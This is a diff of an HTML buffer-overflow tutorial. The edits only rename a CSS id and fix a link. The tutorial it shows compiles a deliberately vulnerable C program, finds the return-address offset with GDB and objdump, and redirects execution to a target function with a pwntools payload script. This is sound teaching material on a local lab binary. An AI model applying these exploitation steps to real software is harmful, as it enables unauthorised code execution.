@@ -68,7 +68,7 @@
         <span id="Checking-for-buffer-overflow" style="position: relative; top: -120px;"></span>
         <h2>Checking for buffer overflow vulnerability</h2>
         <p>Before we begin, store the code snippet provided below in a file and compile it with the command commented in the script</p>
-        <pre><div id="snip"><b><span style="color: #aaa;">//  File name     : controlRIP.c
+        <pre><div class="snip"><b><span style="color: #aaa;">//  File name     : controlRIP.c
 //  Compile with  : gcc controlRIP.c -m64 -no-pie -o controlRIP.elf</span>
 
 <font color="#55FFFF">#include</font> <font color="#FF55FF">&lt;stdio.h&gt;</font>
@@ -91,14 +91,14 @@
         <div id="quote">The flag <span style="color: #000; font-weight: bold">-no-pie</span> disables PIE for the compiled application. This means that the binary will be unaffected by ASLR.</div>
         <p>After compiling, when you feed normal input, it should work just fine</p>
         <pre>
-        <div id="snip"><span style="font-weight: bold;">root@kali</span>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># ./controlRIP.elf 
+        <div class="snip"><span style="font-weight: bold;">root@kali</span>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># ./controlRIP.elf 
 Enter your username : root
 Sorry Mr. root, but you failed.
 <span style="font-weight: bold;">root@kali</span>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># </div>
       </pre>
         <p>But notice when you feed more input than what was expected, you get a seg fault</p>
         <pre>
-        <div id="snip"><span style="font-weight: bold;">root@kali</span>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># python3 -c 'print("A" * 100)' | ./controlRIP.elf 
+        <div class="snip"><span style="font-weight: bold;">root@kali</span>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># python3 -c 'print("A" * 100)' | ./controlRIP.elf 
 Enter your username : Sorry Mr. AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA, but you failed.
 Segmentation fault
 <span style="font-weight: bold;">root@kali</span>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># </div>
@@ -106,7 +106,7 @@ Segmentation fault
         <p>This clearly means that there is a buffer overflow vulnerability.</p>
         <p>Now let's open up the program in GDB and crash it there</p>
         <pre>
-        <div id="snip"><span style="font-weight: bold;">root@kali</span>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># gdb ./controlRIP.elf -q
+        <div class="snip"><span style="font-weight: bold;">root@kali</span>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># gdb ./controlRIP.elf -q
 Reading symbols from <span style="color: #0f5; font-weight: bold;">./controlRIP.elf</span>...
 (No debugging symbols found in <span style="color: #0f5; font-weight: bold;">./controlRIP.elf</span>)
 gdb-peda$ run
@@ -166,10 +166,10 @@ gdb-peda$ </div>
         <div id="quote">AAAAAAAABBBBBBBBCCCCCCCC ...</div>
         <p>to overflow the buffer. This way we can examine which 8 bytes overflowed the RBP and accordingly calculate the offset for <span style="font-weight: bold;">Base Pointer</span></p>
         <p>So the entire pattern will be like this :-</p>
-        <div id="snip">AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZ</div>
+        <div class="snip">AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZ</div>
         <p>Now let's quickly feed this data to our binary</p>
         <pre>
-        <div id="snip">gdb-peda$ run
+        <div class="snip">gdb-peda$ run
 Starting program: /root/Desktop/Buffer Overflow/controlRIP.elf 
 Enter your username : AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZ
 Sorry Mr. AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZ, but you failed.
@@ -234,7 +234,7 @@ gdb-peda$ </div>
         <h2>Fetching the addressing of 'callMe()'</h2>
         <p>Alright, now we need to find the exact address where <abbr title="Our AIM : The function to be called">'callMe()' </abbr> is located. We can do that by using <i>objdump</i> with our binary.</p>
         <pre>
-        <div id="snip"><b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># objdump --help
+        <div class="snip"><b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># objdump --help
 Usage: objdump &lt;option(s)> &lt;file(s)>
  Display information from object &lt;file(s)>.
  At least one of the following switches must be given:
@@ -335,7 +335,7 @@ Report bugs to &lt;http://www.sourceware.org/bugzilla/>.
       </pre>
         <p>As you can see above, the highlighted line is what we are looking for. We must print the symbols in order to get the location of the callMe() function.</p>
         <pre>
-        <div id="snip"><b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># objdump -t controlRIP.elf 
+        <div class="snip"><b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># objdump -t controlRIP.elf 
 
 controlRIP.elf:     file format elf64-x86-64
 
@@ -411,7 +411,7 @@ SYMBOL TABLE:
       </pre>
         <p>Ah well, this seems a lot of output. Maybe we can do a little formatting and filtering?</p>
         <pre>
-        <div id="snip"><b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># echo -n "Base Address: 0x"; objdump -t controlRIP.elf | grep callMe | awk '{print $1}'
+        <div class="snip"><b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># echo -n "Base Address: 0x"; objdump -t controlRIP.elf | grep callMe | awk '{print $1}'
 Base Address: 0x0000000000401142
 <b>root@kali</b>:<span style="color: #8181ff">~/Desktop/Buffer Overflow</span># </div>
       </pre>
@@ -425,7 +425,7 @@ Base Address: 0x0000000000401142
         <p>Okay we now have enough data to exploit this application. Let's make a script in python [ you can alternatively choose another language as well ] which will overflow the buffer and write the base address of the 'callMe()' function to the saved return pointer which according to our theory, should be popped in RIP causing the flow of control to reach that function.</p>
         <p>I have used the script given below</p>
         <pre>
-        <div id="snip"><span style="color: #0ff; font-weight: bold;">from</span> pwn <span style="color: #0ff; font-weight: bold;">import</span> *                   <span style="color: #aaa">#   Import the sys module</span>
+        <div class="snip"><span style="color: #0ff; font-weight: bold;">from</span> pwn <span style="color: #0ff; font-weight: bold;">import</span> *                   <span style="color: #aaa">#   Import the sys module</span>
 <span style="color: #0ff; font-weight: bold;">import</span> sys                          <span style="color: #aaa">#   Import the sys module</span>
 
 offset  =   <span style="color: #f5f; font-weight: bold">72</span>                      <span style="color: #aaa">#   Define 'offset' with 72</span>
@@ -442,12 +442,12 @@ sys.stdout.buffer.write(exploit)    <span style="color: #aaa">#   'exploit' is a
         <div id="quote"><span style="text-transform: uppercase; font-weight: bold">Note : The above script is of python3 and not python2. Also you must replace the memory address of <span style="text-transform: none; border-bottom: 1px solid #000;">callMe()</span> in your case.</span></div>
         <p>Let's see what is the output of this script</p>
         <pre>
-        <div id="snip"><b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># python<b>3</b> payload.py 
+        <div class="snip"><b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># python<b>3</b> payload.py 
 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXB@<b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># </div>
       </pre>
         <p>You must keep in mind that the output is not just the "X", "B" & "@", when you view the hex output you will get something like this :-</p>
         <pre>
-        <div id="snip"><b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># python3 payload.py | xxd
+        <div class="snip"><b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># python3 payload.py | xxd
 00000000: 5858 5858 5858 5858 5858 5858 5858 5858  XXXXXXXXXXXXXXXX
 00000010: 5858 5858 5858 5858 5858 5858 5858 5858  XXXXXXXXXXXXXXXX
 00000020: 5858 5858 5858 5858 5858 5858 5858 5858  XXXXXXXXXXXXXXXX
@@ -461,7 +461,7 @@ XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXB@<b>roo
         <p>Okay, aside from this, the script should be 99% functional</p>
         <p>We have reached the CLIMAX, now let's check if our script helps us acheive our objective</p>
         <pre>
-        <div id="snip"><b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># python3 payload.py | ./controlRIP.elf 
+        <div class="snip"><b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># python3 payload.py | ./controlRIP.elf 
 Enter your username : Sorry Mr. XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXB@, but you failed.
 <span style="font-weight: bold; font-style: italic">[+] Boom! Code execution redirected.</span>
 Segmentation fault
@@ -500,7 +500,7 @@ Segmentation fault
         <p style="cursor: pointer; background-color: transparent;" onclick="location.href='https://vulnx.in/'">Home</p>
         <p style="cursor: pointer; background-color: transparent;" onclick="location.href='https://vulnx.in/Contents/resources.html'">Resources</p>
         <p style="cursor: pointer; background-color: transparent;" onclick="location.href='https://vulnx.in/Contents/tutorials.html'">Tutorials</p>
-        <p style="cursor: pointer; background-color: transparent;" onclick="location.href='https://vulnx.in/Contents/ctfs.html'">CTFs</p>
+        <p style="cursor: pointer; background-color: transparent;" onclick="location.href='https://vulnx.in/Contents/CTFs.html'">CTFs</p>
         <h1 id="footerHeading" style="background-color: transparent; font-family: 'Ubuntu';">Contact</h1>
         <i class="fab fa-facebook-f" style="line-height: 60px; font-size: 26px; background-color: transparent; padding: 0 10px; cursor: pointer;" onclick="location.href='#'"></i>
         <i class="fab fa-google" style="line-height: 60px; font-size: 26px; background-color: transparent; padding: 0 10px; cursor: pointer;" onclick="location.href='mailto:vulnx101@gmail.com'"></i>
